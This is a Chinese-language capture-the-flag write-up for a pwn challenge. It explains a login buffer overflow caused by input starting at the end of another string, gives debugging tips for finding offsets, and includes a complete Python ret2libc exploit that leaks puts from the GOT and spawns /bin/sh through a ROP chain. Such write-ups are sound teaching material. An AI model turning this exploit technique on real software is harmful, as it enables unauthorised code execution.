### 日行

本题目就是简单的ret2libc。选手们主要卡在了确定偏移和patchelf上面，还有反应没有ld，其实都是对pwn的工具集还不够熟悉。希望能够通过这次比赛完善自己的调试技巧和工具集合。

patch和获取ld：https://www.cnblogs.com/9man/p/17581934.html

调试获取偏移技巧：

设置payload数值为cyclic(一个足够大的数字)：

![img](https://h9505dssdj.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDVmNjhhMzRlZGQwNGIwMGY3MmU3YTliMjIyNzM4NjJfM2FNYkJ2WEVvUDdjVWZ3WWZqUG5QZ2JlOHBOaDhXZ01fVG9rZW46WFJlemJBRXRNbzJmYzl4eWxiWmN1ODRZbnRoXzE3NDI0NTkxNTQ6MTc0MjQ2Mjc1NF9WNA)

然后运行查看崩溃点：

![img](https://h9505dssdj.feishu.cn/space/api/box/stream/download/asynccode/?code=YzRiYTg3YmMzOGU1YzI2NTNmNWFhZjY4NjUxYmE1ODdfdHBvbWUyellJVmVyVUdiS0tsSUIwQTNTdDhMcGRhME9fVG9rZW46RW5hcWJyN0J0b1dSQ0p4STNzcWNvQUt0bnBkXzE3NDI0NTkxNTQ6MTc0MjQ2Mjc1NF9WNA)

然后基本就可以确定偏移位置：

![img](https://h9505dssdj.feishu.cn/space/api/box/stream/download/asynccode/?code=M2QyYTBlMzdlNGIzMmU4OTI3ZTU4Nzc2YjAyMzA1ZmRfbXFydnRkVFMzbWJxZ09HdzF2dEFkeE5xbk1pMVRXTW1fVG9rZW46QzA1UGJlVkFxb2x0dGF4TGs2bGN5dVZ5bk9iXzE3NDI0NTkxNTQ6MTc0MjQ2Mjc1NF9WNA)

**另外**，debug的时候，可以使用set follow-fork-mode parent来避免进入子进程。

剩下就是简单的ret2libc了。漏洞点就在login里面，虽然输入长度和buffer都是256，但是输入的开始点是另一个字符串的结尾，这导致了溢出。这在实际场景中比较常见。

```Python
from evilblade import *

setup("./pwn")
libset("./libc.so.6")
rsetup("127.0.0.1", 21097)
evgdb("b *0x401820")
#debug的时候，可以使用set follow-fork-mode parent来避免进入子进程
# context(os='linux', arch='mips', log_level='debug')

puts = sym("puts")
got = got("puts")
sys = sym("system")
main = sym("main")
ret = gg("ret",0)
# rdi = gg("mov rdi, rbp",0)# mov rdi, rbp ; nop ; pop rbp ; ret
rdi = gg("pop rdi",0)

rop1 = rop64([rdi, got, puts, main])
# payload = cyclic(207) + p64(got) + p64(rdi) + p64(puts)*2 + p64(main)
payload = cyclic(207+8) + rop1

sl(b"login")
sl(payload)
# sl(mouse)

# pause()
ru("CheckLogin...")
tet()
puts_real = getx64(0,-1)
libcbase = getbase(puts_real,"puts")
sh = string("/bin/sh", libcbase)
rop2 = rop64([rdi, sh, ret, sys, main])

# payload = cyclic(207) + p64(sh) + p64(rdi) + p64(ret)*2 + p64(sys) + p64(main)
payload = cyclic(207+8) + rop2
sl(b"login")
sl(payload)
congra()
ia()
```

![img](https://h9505dssdj.feishu.cn/space/api/box/stream/download/asynccode/?code=YWJhOGQxYmZlNzA0MGY0M2FjNjMwMjlhY2NmZWU1YmVfUkU2UzlsRHFYWldWMUVQOG5jRXJuOW5NN2hQZWNidGtfVG9rZW46TlEwZWIybmtTb1FIWlh4UUlsZmNuSVA3bmhiXzE3NDI0NTkxNTQ6MTc0MjQ2Mjc1NF9WNA)